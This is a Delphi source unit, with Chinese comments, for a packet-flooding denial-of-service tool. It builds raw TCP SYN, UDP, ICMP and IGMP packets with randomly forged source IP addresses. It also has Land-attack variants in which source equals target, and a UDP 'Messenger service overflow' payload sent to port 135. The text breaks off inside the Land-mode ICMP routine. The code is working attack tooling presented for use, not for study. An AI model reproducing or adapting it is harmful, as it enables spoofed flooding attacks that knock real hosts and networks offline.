
//SYN 拒绝服务攻击 DDOS 伪造IP源

unit Winsock2Flood;

interface
uses
  Windows, Winsock, SysUtils, Math; //RandomRange函数

const
  UDP_MAX_MESSAGE = 4068;
  UDP_MAX_PACKET = 4096;
  ICMP_MAX_PACKET = 65535;
  IGMP_MAX_PACKET = ICMP_MAX_PACKET;
  ICMP_PACKET = 65000;
  IGMP_PACKET = ICMP_PACKET;
  IP_HDRINCL = 2;
  HEADER_SEQ = $28376839;

type
  TTCPPacketBuffer = array[0..59] of Byte;
  TUDPPacketBuffer = array[0..UDP_MAX_PACKET - 1] of Byte;
  TICMPPacketBuffer = array[0..ICMP_MAX_PACKET - 1] of Byte;
  TIGMPPacketBuffer = array[0..IGMP_MAX_PACKET - 1] of Byte;


//通用IP头的结构
type
  T_IP_Header = record
    ip_verlen: Byte; //4位头标长,4位IP版本号
    ip_tos: Byte; //服务类型
    ip_totallength: Word; //总长度
    ip_id: Word; //标识
    ip_offset: Word; //标志和片偏移
    ip_ttl: Byte; //生存时间
    ip_protocol: Byte; //协议类型
    ip_checksum: Word; //头标校验和
    ip_srcaddr: Longword; //源IP地址
    ip_destaddr: Longword; //目标IP地址
  end;

//TCP伪头
type
  T_PSDTCP_Header = record
    SourceAddr: DWORD; //源地址
    DestinationAddr: DWORD; //目标地址
    Mbz: Byte; //
    Protocol: Byte; //协议类型
    TcpLength: Word; //TCP长度
  end;

//TCP头
type
  T_TCP_Header = record
    src_portno: Word; //源端口
    dst_portno: Word; //目的端口
    tcp_seq: DWORD; //序列号
    tcp_ack: DWORD; //确认号
    tcp_lenres: Byte; //4位首部长度/6位保留字
    tcp_flag: Byte; //标志位 2是SYN，1是FIN，16是ACK探测
    tcp_win: Word; //窗口大小
    tcp_checksum: Word; //校验和
    tcp_offset: Word; //紧急数据偏移量
  end;

//UDP头
type
  T_UDP_Header = record
    src_portno: Word;
    dst_portno: Word;
    udp_length: Word;
    udp_checksum: Word;
  end;

//ICMP头
type
  T_ICMP_Header = record
    icmp_type: Byte;
    icmp_code: Byte;
    icmp_checksum: Word;
    icmp_id: Word;
    icmp_seq: Word;
    timestamp: ULONG;
  end;

//IGMP头
type
  T_IGMP_Header = record
    igmp_type: Byte; //协议的信息类型
    igmp_code: Byte; //routing code
    igmp_checksum: Word; //校验和
    group: ULONG;
  end;

function CheckSum(var Buffer; Size: Integer): Word;

//(1)随机信息重建TCP头
procedure BuildTCPHeaders(ToIP: string;
  var Buf: TTCPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

//(2)Land模式重建TCP头
procedure LandBuildTCPHeaders(ToIP: string;
  var Buf: TTCPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

//(1)随机信息重建UDP头
procedure BuildUDPHeaders(ToIP: string; StrMessage: string;
  var Buf: TUDPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

//(2)Land模式重建UDP头
procedure LandBuildUDPHeaders(ToIP: string; StrMessage: string;
  var Buf: TUDPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

//(3)Messenger服务溢出模式重建UDP头
procedure MsgOverflowBuildUDPHeaders(ToIP: string; StrMessage: string;
  var Buf: TUDPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

//(1)随机信息重建ICMP头
procedure BuildICMPHeaders(ToIP: string;
  var Buf: TICMPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

//(2)Land模式重建ICMP头
procedure LandBuildICMPHeaders(ToIP: string;
  var Buf: TICMPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

//(1)随机信息重建IGMP头
procedure BuildIGMPHeaders(ToIP: string;
  var Buf: TIGMPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

//(2)Land模式重建IGMP头
procedure LandBuildIGMPHeaders(ToIP: string;
  var Buf: TIGMPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);

//NT系统最为关键的一个功能函数与9x系列功能不同
function NTXPsetsockopt(s: TSocket; level, optname: Integer; optval: PChar;
  optlen: Integer): Integer; stdcall; external 'WS2_32.DLL' Name 'setsockopt';

//WinSock2的WSASocket函数使用常量
const
  WSA_FLAG_OVERLAPPED = $01;
  WSA_FLAG_MULTIPOINT_C_ROOT = $02;
  WSA_FLAG_MULTIPOINT_C_LEAF = $04;
  WSA_FLAG_MULTIPOINT_D_ROOT = $08;
  WSA_FLAG_MULTIPOINT_D_LEAF = $10;
//
  MAX_PROTOCOL_CHAIN = 7;
  WSAPROTOCOL_LEN = 255;

type
  _WSAPROTOCOLCHAIN = record
    ChainLen: Integer; // the length of the chain,
                                // length = 0 means layered protocol,
                                // length = 1 means base protocol,
                                // length > 1 means protocol chain
    ChainEntries: array[0..MAX_PROTOCOL_CHAIN - 1] of DWORD; // a list of dwCatalogEntryIds
  end;
  WSAPROTOCOLCHAIN = _WSAPROTOCOLCHAIN;

  LPWSAPROTOCOL_INFOW = ^WSAPROTOCOL_INFOW;
  _WSAPROTOCOL_INFOW = record
    dwServiceFlags1: DWORD;
    dwServiceFlags2: DWORD;
    dwServiceFlags3: DWORD;
    dwServiceFlags4: DWORD;
    dwProviderFlags: DWORD;
    ProviderId: TGUID;
    dwCatalogEntryId: DWORD;
    ProtocolChain: WSAPROTOCOLCHAIN;
    iVersion: Integer;
    iAddressFamily: Integer;
    iMaxSockAddr: Integer;
    iMinSockAddr: Integer;
    iSocketType: Integer;
    iProtocol: Integer;
    iProtocolMaxOffset: Integer;
    iNetworkByteOrder: Integer;
    iSecurityScheme: Integer;
    dwMessageSize: DWORD;
    dwProviderReserved: DWORD;
    szProtocol: array[0..WSAPROTOCOL_LEN] of WideChar;
  end;
  WSAPROTOCOL_INFOW = _WSAPROTOCOL_INFOW;

function WSASocket(af, type_, Protocol: Integer; lpProtocolInfo: LPWSAPROTOCOL_INFOW;
  g: Cardinal; dwFlags: DWORD): TSocket; stdcall; external 'WS2_32.DLL' Name 'WSASocketW';

//全局变量
var
//TCP部分公共变量
  TCPBuf: TTCPPacketBuffer;
  TCPRemote: TSockAddr;
  TCPiTotalSize: Word;
//UDP部分公共变量
  UDPBuf: TUDPPacketBuffer;
  UDPRemote: TSockAddr;
  UDPiTotalSize: Word;
  UDPFloodStr: string;
//ICMP部分公共变量
  ICMPBuf: TICMPPacketBuffer;
  ICMPRemote: TSockAddr;
  ICMPiTotalSize: Word;
//IGMP部分公共变量
  IGMPBuf: TIGMPPacketBuffer;
  IGMPRemote: TSockAddr;
  IGMPiTotalSize: Word;

implementation

function CheckSum(var Buffer; Size: Integer): Word;
type
  TWordArray = array[0..1] of Word;
var
  ChkSum: Longword;
  I: Integer;
begin
  ChkSum := 0; I := 0;
  while Size > 1 do
  begin
    Inc(ChkSum, TWordArray(Buffer)[I]);
    Inc(I);
    Dec(Size, SizeOf(Word));
  end;
  if Size = 1 then ChkSum := ChkSum + Byte(TWordArray(Buffer)[I]);
  ChkSum := (ChkSum shr 16) + (ChkSum and $FFFF);
  Inc(ChkSum, (ChkSum shr 16));
  Result := Word(not ChkSum);
end;

//(1)重建TCP的IP头部信息
procedure BuildTCPHeaders(ToIP: string;
  var Buf: TTCPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);
var
  FromIP: string;
  IPHeader: T_IP_Header;
  TCPHeader: T_TCP_Header;
  PsdHeader: T_PSDTCP_Header;
  iIPVersion, iIPSize: Word;
begin
  Randomize;
  Remote.sin_family := AF_INET;
  Remote.sin_port := htons(Random(65535) + 1);
  Remote.sin_addr.S_addr := inet_Addr(PChar(ToIP));
//第一部分：初始化IP头
  iTotalSize := SizeOf(T_IP_Header) + SizeOf(T_TCP_Header);
  iIPVersion := 4;
  iIPSize := SizeOf(T_IP_Header) div SizeOf(Longword);
  IPHeader.ip_verlen := (iIPVersion shl 4) or iIPSize;
  IPHeader.ip_tos := 0; //IP服务类型
  IPHeader.ip_offset := 0; //段偏移域
  IPHeader.ip_totallength := htons(iTotalSize); //数据包长度
  IPHeader.ip_id := 1; //与UDP不同
  IPHeader.ip_ttl := RandomRange(128, 250); //生存时间
  IPHeader.ip_protocol := IPPROTO_TCP; //协议类型
  IPHeader.ip_checksum := 0; //校验和
//随机产生源地址
  FromIP := IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1) + '.' +
    IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1);
  IPHeader.ip_srcaddr := inet_Addr(PChar(FromIP));
  IPHeader.ip_destaddr := Remote.sin_addr.S_addr; //目标地址

//第二部分：初始化TCP头
//随机产生源端口
  TCPHeader.src_portno := htons(Random(65536) + 1); //源端口
  TCPHeader.dst_portno := Remote.sin_port; //目标端口
  TCPHeader.tcp_seq := htonl(HEADER_SEQ); //序列号
  TCPHeader.tcp_ack := 0; //确认号
  TCPHeader.tcp_lenres := (SizeOf(T_TCP_Header) shr 2 shl 4) or 0; //首部长度
  TCPHeader.tcp_flag := 2; //2是SYN，1是FIN，16是ACK探测
  TCPHeader.tcp_win := htons(16384); //窗口大小
  TCPHeader.tcp_checksum := 0; //校验和
  TCPHeader.tcp_offset := 0; //紧急偏移量

//第三部分：初始化TCP伪头
  PsdHeader.SourceAddr := IPHeader.ip_srcaddr;
  PsdHeader.DestinationAddr := IPHeader.ip_destaddr;
  PsdHeader.Mbz := 0;
  PsdHeader.Protocol := IPPROTO_TCP;
  PsdHeader.TcpLength := htons(SizeOf(T_TCP_Header));

//第四部分：计算校验和
  FillChar(Buf, SizeOf(Buf), #0);
//将两个字段复制到同一个缓冲区Buf中并计算TCP头校验和
  CopyMemory(@Buf[0], @PsdHeader, SizeOf(T_PSDTCP_Header));
  CopyMemory(@Buf[SizeOf(T_PSDTCP_Header)], @TCPHeader, SizeOf(T_TCP_Header));
  TCPHeader.tcp_checksum := CheckSum(Buf, SizeOf(T_PSDTCP_Header) + SizeOf(T_TCP_Header));

//计算IP头校验和的时候不需要包括TCP伪首部
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @TCPHeader, SizeOf(T_TCP_Header));
  FillChar(Buf[SizeOf(T_IP_Header) + SizeOf(T_TCP_Header)], 4, #0);
  IPHeader.ip_checksum := CheckSum(Buf, SizeOf(T_IP_Header) + SizeOf(T_TCP_Header));

//再将计算过校验和的IP头与TCP头复制到同一个缓冲区中
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
end;

//(2)Land模式(只需在初始化时候重建一次即可)重建TCP头部信息
procedure LandBuildTCPHeaders(ToIP: string;
  var Buf: TTCPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);
var
  IPHeader: T_IP_Header;
  TCPHeader: T_TCP_Header;
  PsdHeader: T_PSDTCP_Header;
  iIPVersion, iIPSize: Word;
begin
  Randomize;
  Remote.sin_family := AF_INET;
  Remote.sin_port := htons(Random(65535) + 1);
  Remote.sin_addr.S_addr := inet_Addr(PChar(ToIP));
//第一部分：初始化IP头
  iTotalSize := SizeOf(T_IP_Header) + SizeOf(T_TCP_Header);
  iIPVersion := 4;
  iIPSize := SizeOf(T_IP_Header) div SizeOf(Longword);
  IPHeader.ip_verlen := (iIPVersion shl 4) or iIPSize;
  IPHeader.ip_tos := 0; //IP服务类型
  IPHeader.ip_offset := 0; //段偏移域
  IPHeader.ip_totallength := htons(iTotalSize); //数据包长度
  IPHeader.ip_id := 1; //与UDP不同
  IPHeader.ip_ttl := RandomRange(128, 250); //生存时间
  IPHeader.ip_protocol := IPPROTO_TCP; //协议类型
  IPHeader.ip_checksum := 0; //校验和

  IPHeader.ip_srcaddr := Remote.sin_addr.S_addr; //源地址
  IPHeader.ip_destaddr := Remote.sin_addr.S_addr; //目标地址

//第二部分：初始化TCP头
  TCPHeader.src_portno := htons(Random(65536) + 1); //源端口
  TCPHeader.dst_portno := Remote.sin_port; //目标端口
  TCPHeader.tcp_seq := htonl(HEADER_SEQ); //序列号
  TCPHeader.tcp_ack := 0; //确认号
  TCPHeader.tcp_lenres := (SizeOf(T_TCP_Header) shr 2 shl 4) or 0; //首部长度
  TCPHeader.tcp_flag := 2; //2是SYN，1是FIN，16是ACK探测
  TCPHeader.tcp_win := htons(16384); //窗口大小
  TCPHeader.tcp_checksum := 0; //校验和
  TCPHeader.tcp_offset := 0; //紧急偏移量

//第三部分：初始化TCP伪头
  PsdHeader.SourceAddr := IPHeader.ip_srcaddr;
  PsdHeader.DestinationAddr := IPHeader.ip_destaddr;
  PsdHeader.Mbz := 0;
  PsdHeader.Protocol := IPPROTO_TCP;
  PsdHeader.TcpLength := htons(SizeOf(T_TCP_Header));

//第四部分：计算校验和
  FillChar(Buf, SizeOf(Buf), #0);
//将两个字段复制到同一个缓冲区Buf中并计算TCP头校验和
  CopyMemory(@Buf[0], @PsdHeader, SizeOf(T_PSDTCP_Header));
  CopyMemory(@Buf[SizeOf(T_PSDTCP_Header)], @TCPHeader, SizeOf(T_TCP_Header));
  TCPHeader.tcp_checksum := CheckSum(Buf, SizeOf(T_PSDTCP_Header) + SizeOf(T_TCP_Header));

//计算IP头校验和的时候不需要包括TCP伪首部
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @TCPHeader, SizeOf(T_TCP_Header));
  FillChar(Buf[SizeOf(T_IP_Header) + SizeOf(T_TCP_Header)], 4, #0);
  IPHeader.ip_checksum := CheckSum(Buf, SizeOf(T_IP_Header) + SizeOf(T_TCP_Header));

//再将计算过校验和的IP头与TCP头复制到同一个缓冲区中
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
end;

//(1)重建UDP的IP头部信息
procedure BuildUDPHeaders(ToIP: string; StrMessage: string;
  var Buf: TUDPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);
var
  FromIP: string;
  iIPVersion: Word;
  iIPSize: Word;
  IPHeader: T_IP_Header;
  UDPHeader: T_UDP_Header;
  iUdpChecksumSize: Word;
  ChSum: Word;
  Ptr: ^Byte;

  procedure IncPtr(Value: Integer);
  begin
    Ptr := Pointer(Integer(Ptr) + Value);
  end;

begin
  Randomize;
  Remote.sin_family := AF_INET;
//随机产生目标端口
  Remote.sin_port := htons(Random(65535) + 1);
  Remote.sin_addr.S_addr := inet_Addr(PChar(ToIP));

//第一部分：初始化IP头
  iTotalSize := SizeOf(T_IP_Header) + SizeOf(T_UDP_Header) + Length(StrMessage);
  iIPVersion := 4;
  iIPSize := SizeOf(T_IP_Header) div SizeOf(Longword);
  IPHeader.ip_verlen := (iIPVersion shl 4) or iIPSize;
  IPHeader.ip_tos := 0; // IP服务类型
  IPHeader.ip_totallength := htons(iTotalSize); // 数据包长度
  IPHeader.ip_id := 0;
  IPHeader.ip_offset := 0; // 段偏移域
  IPHeader.ip_ttl := RandomRange(128, 250); // 存活期
  IPHeader.ip_protocol := IPPROTO_UDP; // 协议类型
  IPHeader.ip_checksum := 0; // 校验和
//随机产生源地址
  FromIP := IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1) + '.' +
    IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1);
  IPHeader.ip_srcaddr := inet_Addr(PChar(FromIP)); //源地址
  IPHeader.ip_destaddr := Remote.sin_addr.S_addr; //目标地址

//第二部分：初始化UDP头
//随机产生源端口和目标端口
  UDPHeader.src_portno := htons(Random(65536) + 1);
  UDPHeader.dst_portno := Remote.sin_port; //目标端口
  UDPHeader.udp_length := htons(SizeOf(T_UDP_Header) + Length(StrMessage)); //UDP包大小
  UDPHeader.udp_checksum := 0; //校验和

//第三部分：计算校验和
  iUdpChecksumSize := 0;
  Ptr := @Buf[0];
  FillChar(Buf, SizeOf(Buf), #0);
  Move(IPHeader.ip_srcaddr, Ptr^, SizeOf(IPHeader.ip_srcaddr));
  IncPtr(SizeOf(IPHeader.ip_srcaddr));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(IPHeader.ip_srcaddr);
  Move(IPHeader.ip_destaddr, Ptr^, SizeOf(IPHeader.ip_destaddr));
  IncPtr(SizeOf(IPHeader.ip_destaddr));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(IPHeader.ip_destaddr);
  IncPtr(1);
  Inc(iUdpChecksumSize);
  Move(IPHeader.ip_protocol, Ptr^, SizeOf(IPHeader.ip_protocol));
  IncPtr(SizeOf(IPHeader.ip_protocol));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(IPHeader.ip_protocol);
  Move(UDPHeader.udp_length, Ptr^, SizeOf(UDPHeader.udp_length));
  IncPtr(SizeOf(UDPHeader.udp_length));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(UDPHeader.udp_length);
  Move(UDPHeader, Ptr^, SizeOf(T_UDP_Header));
  IncPtr(SizeOf(T_UDP_Header));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(T_UDP_Header);
  Move(StrMessage[1], Ptr^, Length(StrMessage));
  IncPtr(Length(StrMessage));
  iUdpChecksumSize := iUdpChecksumSize + Length(StrMessage);
  ChSum := CheckSum(Buf, iUdpChecksumSize);
  UDPHeader.udp_checksum := ChSum;
//填充缓冲区
  FillChar(Buf, SizeOf(Buf), #0);
  Ptr := @Buf[0];
  Move(IPHeader, Ptr^, SizeOf(T_IP_Header)); IncPtr(SizeOf(T_IP_Header));
  Move(UDPHeader, Ptr^, SizeOf(T_UDP_Header)); IncPtr(SizeOf(T_UDP_Header));
  Move(StrMessage[1], Ptr^, Length(StrMessage));
end;

//(2)Land模式重建UDP头
procedure LandBuildUDPHeaders(ToIP: string; StrMessage: string;
  var Buf: TUDPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);
var
  iIPVersion: Word;
  iIPSize: Word;
  IPHeader: T_IP_Header;
  UDPHeader: T_UDP_Header;
  iUdpChecksumSize: Word;
  ChSum: Word;
  Ptr: ^Byte;

  procedure IncPtr(Value: Integer);
  begin
    Ptr := Pointer(Integer(Ptr) + Value);
  end;

begin
  Randomize;
  Remote.sin_family := AF_INET;
  Remote.sin_port := htons(Random(65535) + 1);
  Remote.sin_addr.S_addr := inet_Addr(PChar(ToIP));

//第一部分：初始化IP头
  iTotalSize := SizeOf(T_IP_Header) + SizeOf(T_UDP_Header) + Length(StrMessage);
  iIPVersion := 4;
  iIPSize := SizeOf(T_IP_Header) div SizeOf(Longword);
  IPHeader.ip_verlen := (iIPVersion shl 4) or iIPSize;
  IPHeader.ip_tos := 0; // IP服务类型
  IPHeader.ip_totallength := htons(iTotalSize); // 数据包长度
  IPHeader.ip_id := 0;
  IPHeader.ip_offset := 0; // 段偏移域
  IPHeader.ip_ttl := RandomRange(128, 250); // 存活期
  IPHeader.ip_protocol := IPPROTO_UDP; // 协议类型
  IPHeader.ip_checksum := 0; // 校验和
  IPHeader.ip_srcaddr := Remote.sin_addr.S_addr; //源地址
  IPHeader.ip_destaddr := Remote.sin_addr.S_addr; //目标地址

//第二部分：初始化UDP头
  UDPHeader.src_portno := htons(Random(65536) + 1);
  UDPHeader.dst_portno := Remote.sin_port; //目标端口
  UDPHeader.udp_length := htons(SizeOf(T_UDP_Header) + Length(StrMessage)); //UDP包大小
  UDPHeader.udp_checksum := 0; //校验和

//第三部分：计算校验和
  iUdpChecksumSize := 0;
  Ptr := @Buf[0];
  FillChar(Buf, SizeOf(Buf), #0);
  Move(IPHeader.ip_srcaddr, Ptr^, SizeOf(IPHeader.ip_srcaddr));
  IncPtr(SizeOf(IPHeader.ip_srcaddr));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(IPHeader.ip_srcaddr);
  Move(IPHeader.ip_destaddr, Ptr^, SizeOf(IPHeader.ip_destaddr));
  IncPtr(SizeOf(IPHeader.ip_destaddr));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(IPHeader.ip_destaddr);
  IncPtr(1);
  Inc(iUdpChecksumSize);
  Move(IPHeader.ip_protocol, Ptr^, SizeOf(IPHeader.ip_protocol));
  IncPtr(SizeOf(IPHeader.ip_protocol));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(IPHeader.ip_protocol);
  Move(UDPHeader.udp_length, Ptr^, SizeOf(UDPHeader.udp_length));
  IncPtr(SizeOf(UDPHeader.udp_length));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(UDPHeader.udp_length);
  Move(UDPHeader, Ptr^, SizeOf(UDPHeader));
  IncPtr(SizeOf(T_UDP_Header));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(T_UDP_Header);
  Move(StrMessage[1], Ptr^, Length(StrMessage));
  IncPtr(Length(StrMessage));
  iUdpChecksumSize := iUdpChecksumSize + Length(StrMessage);
  ChSum := CheckSum(Buf, iUdpChecksumSize);
  UDPHeader.udp_checksum := ChSum;
//填充缓冲区
  FillChar(Buf, SizeOf(Buf), #0);
  Ptr := @Buf[0];
  Move(IPHeader, Ptr^, SizeOf(T_IP_Header)); IncPtr(SizeOf(T_IP_Header));
  Move(UDPHeader, Ptr^, SizeOf(T_UDP_Header)); IncPtr(SizeOf(T_UDP_Header));
  Move(StrMessage[1], Ptr^, Length(StrMessage));
end;

//(3)Messenger服务溢出模式重建UDP头
procedure MsgOverflowBuildUDPHeaders(ToIP: string; StrMessage: string;
  var Buf: TUDPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);
var
  FromIP: string;
  iIPVersion: Word;
  iIPSize: Word;
  IPHeader: T_IP_Header;
  UDPHeader: T_UDP_Header;
  iUdpChecksumSize: Word;
  ChSum: Word;
  Ptr: ^Byte;

  procedure IncPtr(Value: Integer);
  begin
    Ptr := Pointer(Integer(Ptr) + Value);
  end;

begin
  Randomize;
  Remote.sin_family := AF_INET;
//制定为135端口
  Remote.sin_port := htons(135);
  Remote.sin_addr.S_addr := inet_Addr(PChar(ToIP));

//第一部分：初始化IP头
  iTotalSize := SizeOf(T_IP_Header) + SizeOf(T_UDP_Header) + Length(StrMessage);
  iIPVersion := 4;
  iIPSize := SizeOf(T_IP_Header) div SizeOf(Longword);
  IPHeader.ip_verlen := (iIPVersion shl 4) or iIPSize;
  IPHeader.ip_tos := 0; // IP服务类型
  IPHeader.ip_totallength := htons(iTotalSize); // 数据包长度
  IPHeader.ip_id := 0;
  IPHeader.ip_offset := 0; // 段偏移域
  IPHeader.ip_ttl := RandomRange(128, 250); // 存活期
  IPHeader.ip_protocol := IPPROTO_UDP; // 协议类型
  IPHeader.ip_checksum := 0; // 校验和
//随机产生源地址
  FromIP := IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1) + '.' +
    IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1);
  IPHeader.ip_srcaddr := inet_Addr(PChar(FromIP)); //源地址
  IPHeader.ip_destaddr := Remote.sin_addr.S_addr; //目标地址

//第二部分：初始化UDP头
//随机产生源端口和目标端口
  UDPHeader.src_portno := htons(Random(65536) + 1);
  UDPHeader.dst_portno := Remote.sin_port; //目标端口
  UDPHeader.udp_length := htons(SizeOf(T_UDP_Header) + Length(StrMessage)); //UDP包大小
  UDPHeader.udp_checksum := 0; //校验和

//第三部分：计算校验和
  iUdpChecksumSize := 0;
  Ptr := @Buf[0];
  FillChar(Buf, SizeOf(Buf), #0);
  Move(IPHeader.ip_srcaddr, Ptr^, SizeOf(IPHeader.ip_srcaddr));
  IncPtr(SizeOf(IPHeader.ip_srcaddr));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(IPHeader.ip_srcaddr);
  Move(IPHeader.ip_destaddr, Ptr^, SizeOf(IPHeader.ip_destaddr));
  IncPtr(SizeOf(IPHeader.ip_destaddr));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(IPHeader.ip_destaddr);
  IncPtr(1);
  Inc(iUdpChecksumSize);
  Move(IPHeader.ip_protocol, Ptr^, SizeOf(IPHeader.ip_protocol));
  IncPtr(SizeOf(IPHeader.ip_protocol));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(IPHeader.ip_protocol);
  Move(UDPHeader.udp_length, Ptr^, SizeOf(UDPHeader.udp_length));
  IncPtr(SizeOf(UDPHeader.udp_length));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(UDPHeader.udp_length);
  Move(UDPHeader, Ptr^, SizeOf(T_UDP_Header));
  IncPtr(SizeOf(T_UDP_Header));
  iUdpChecksumSize := iUdpChecksumSize + SizeOf(T_UDP_Header);
  Move(StrMessage[1], Ptr^, Length(StrMessage));
  IncPtr(Length(StrMessage));
  iUdpChecksumSize := iUdpChecksumSize + Length(StrMessage);
  ChSum := CheckSum(Buf, iUdpChecksumSize);
  UDPHeader.udp_checksum := ChSum;
//消息服务将$14分解为CR+LF字符,在此处做溢出数据包
  FillChar(Buf, SizeOf(Buf), $14);
  Buf[3992 - ChSum + SizeOf(T_IP_Header) - SizeOf(T_UDP_Header) - 1] := 0;
  Ptr := @Buf[0];
  Move(IPHeader, Ptr^, SizeOf(T_IP_Header)); IncPtr(SizeOf(T_IP_Header));
  Move(UDPHeader, Ptr^, SizeOf(T_UDP_Header)); IncPtr(SizeOf(T_UDP_Header));
  Move(StrMessage[1], Ptr^, Length(StrMessage));
end;

//(1)随机信息重键ICMP头
procedure BuildICMPHeaders(ToIP: string;
  var Buf: TICMPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);
var
  FromIP: string;
  IPHeader: T_IP_Header;
  ICMPHeader: T_ICMP_Header;
  iIPVersion, iIPSize: Word;
begin
  Randomize;
  Remote.sin_family := AF_INET;
  Remote.sin_port := htons(Random(65535) + 1);
  Remote.sin_addr.S_addr := inet_Addr(PChar(ToIP));
//第一部分：初始化IP头
  iTotalSize := SizeOf(T_IP_Header) + SizeOf(T_ICMP_Header) + ICMP_PACKET;
  iIPVersion := 4;
  iIPSize := SizeOf(T_IP_Header) div SizeOf(Longword);
  IPHeader.ip_verlen := (iIPVersion shl 4) or iIPSize;
  IPHeader.ip_tos := 0; //IP服务类型
  IPHeader.ip_offset := 0; //段偏移域
  IPHeader.ip_totallength := htons(iTotalSize); //数据包长度
  IPHeader.ip_id := 1; //与UDP不同
  IPHeader.ip_ttl := RandomRange(128, 250); //生存时间
  IPHeader.ip_protocol := IPPROTO_ICMP; //协议类型
  IPHeader.ip_checksum := 0; //校验和

//随机产生源地址
  FromIP := IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1) + '.' +
    IntToStr(Random(254) + 1) + '.' + IntToStr(Random(254) + 1);
  IPHeader.ip_srcaddr := inet_Addr(PChar(FromIP));
  IPHeader.ip_destaddr := Remote.sin_addr.S_addr; //目标地址

//第二部分：初始化ICMP头
  ICMPHeader.icmp_type := 0; //0,14效果好
  ICMPHeader.icmp_code := 255;
  ICMPHeader.icmp_checksum := 0;
  ICMPHeader.icmp_id := 2;
  ICMPHeader.icmp_seq := 999;
  ICMPHeader.timestamp := GetTickCount;

//第三部分：计算校验和
  FillChar(Buf, SizeOf(Buf), #0);
//计算ICMP头校验和
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @ICMPHeader, SizeOf(T_ICMP_Header));
  FillChar(Buf[SizeOf(T_IP_Header) + SizeOf(T_ICMP_Header)], ICMP_PACKET, 'E');
  ICMPHeader.icmp_checksum := CheckSum(Buf, iTotalSize);

//计算IP头校验和
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @ICMPHeader, SizeOf(T_ICMP_Header));
  IPHeader.ip_checksum := CheckSum(Buf, SizeOf(T_IP_Header) + SizeOf(T_ICMP_Header));

  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
end;

//(2)Land模式重建ICMP头
procedure LandBuildICMPHeaders(ToIP: string;
  var Buf: TICMPPacketBuffer; var Remote: TSockAddr;
  var iTotalSize: Word);
var
  IPHeader: T_IP_Header;
  ICMPHeader: T_ICMP_Header;
  iIPVersion, iIPSize: Word;
begin
  Randomize;
  Remote.sin_family := AF_INET;
  Remote.sin_port := htons(Random(65535) + 1);
  Remote.sin_addr.S_addr := inet_Addr(PChar(ToIP));
//第一部分：初始化IP头
  iTotalSize := SizeOf(T_IP_Header) + SizeOf(T_ICMP_Header) + ICMP_PACKET;
  iIPVersion := 4;
  iIPSize := SizeOf(T_IP_Header) div SizeOf(Longword);
  IPHeader.ip_verlen := (iIPVersion shl 4) or iIPSize;
  IPHeader.ip_tos := 0; //IP服务类型
  IPHeader.ip_offset := 0; //段偏移域
  IPHeader.ip_totallength := htons(iTotalSize); //数据包长度
  IPHeader.ip_id := 1; //与UDP不同
  IPHeader.ip_ttl := RandomRange(128, 250); //生存时间
  IPHeader.ip_protocol := IPPROTO_ICMP; //协议类型
  IPHeader.ip_checksum := 0; //校验和
  IPHeader.ip_srcaddr := Remote.sin_addr.S_addr; //源地址
  IPHeader.ip_destaddr := Remote.sin_addr.S_addr; //目标地址

//第二部分：初始化ICMP头
  ICMPHeader.icmp_type := 0; //0,14效果好
  ICMPHeader.icmp_code := 255;
  ICMPHeader.icmp_checksum := 0;
  ICMPHeader.icmp_id := 2;
  ICMPHeader.icmp_seq := 999;
  ICMPHeader.timestamp := GetTickCount;

//第三部分：计算校验和
  FillChar(Buf, SizeOf(Buf), #0);
//计算ICMP头校验和
  CopyMemory(@Buf[0], @IPHeader, SizeOf(T_IP_Header));
  CopyMemory(@Buf[SizeOf(T_IP_Header)], @ICMPHeader, SizeOf(T_ICMP_Header));
  FillChar(Buf[SizeOf(T_IP_Header) + SizeOf(T_ICMP_Header)], ICMP_PACKET, 'E');
  ICMPHeader.icmp_checksum := CheckSum(Buf, iTotalSize);

//计算IP头校验和
